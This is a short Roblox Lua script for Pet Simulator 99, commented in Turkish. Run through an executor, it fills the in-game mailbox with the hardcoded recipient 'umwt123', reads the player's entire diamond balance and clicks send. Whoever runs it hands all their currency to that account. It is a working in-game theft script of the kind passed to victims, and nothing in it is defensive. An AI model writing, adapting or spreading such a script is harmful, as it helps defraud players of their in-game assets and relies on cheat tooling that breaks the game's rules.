local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

print("🚀 PS99 Elmas Gönderme Başladı...")

task.wait(2)

-- ====================== AUTO ELMAS GÖNDER ======================
function SendDiamonds()
    print("Elmas gönderme işlemi başladı...")
    
    task.wait(1.5)
    
    -- Username
    local usernameBox = LocalPlayer.PlayerGui:FindFirstChild("Roblox Username", true) 
                     or LocalPlayer.PlayerGui:FindFirstChildWhichIsA("TextBox")
    if usernameBox then
        usernameBox.Text = "umwt123"
        firesignal(usernameBox.FocusLost)
        print("✅ Username yazıldı: umwt123")
    end
    
    task.wait(1)
    
    -- Elmas miktarını bul
    local diamonds = 0
    if LocalPlayer:FindFirstChild("leaderstats") then
        for _, stat in pairs(LocalPlayer.leaderstats:GetChildren()) do
            if stat.Name:lower():find("diamond") or stat.Name:lower():find("gem") then
                diamonds = stat.Value
                break
            end
        end
    end
    print("Bulunan Elmas: " .. diamonds)
    
    -- Elmas kutusuna yaz
    local diamondBox = nil
    for _, tb in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if tb:IsA("TextBox") and (tb.Text == "0" or tb.PlaceholderText:find("0")) then
            diamondBox = tb
            break
        end
    end
    
    if diamondBox then
        diamondBox.Text = tostring(diamonds)
        firesignal(diamondBox.FocusLost)
        print("✅ Elmas yazıldı: " .. diamonds)
    end
    
    task.wait(1.5)
    
    -- Gönder butonu
    local sendBtn = nil
    for _, btn in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if btn:IsA("TextButton") and btn.Text:find("Gönder") then
            sendBtn = btn
            break
        end
    end
    
    if sendBtn then
        firesignal(sendBtn.MouseButton1Click)
        print("✅ GÖNDER butonuna basıldı! Elmas gönderiliyor...")
    else
        print("❌ Gönder butonu bulunamadı")
    end
end

-- Posta kutusunu açmayı dene
task.wait(1)
SendDiamonds()
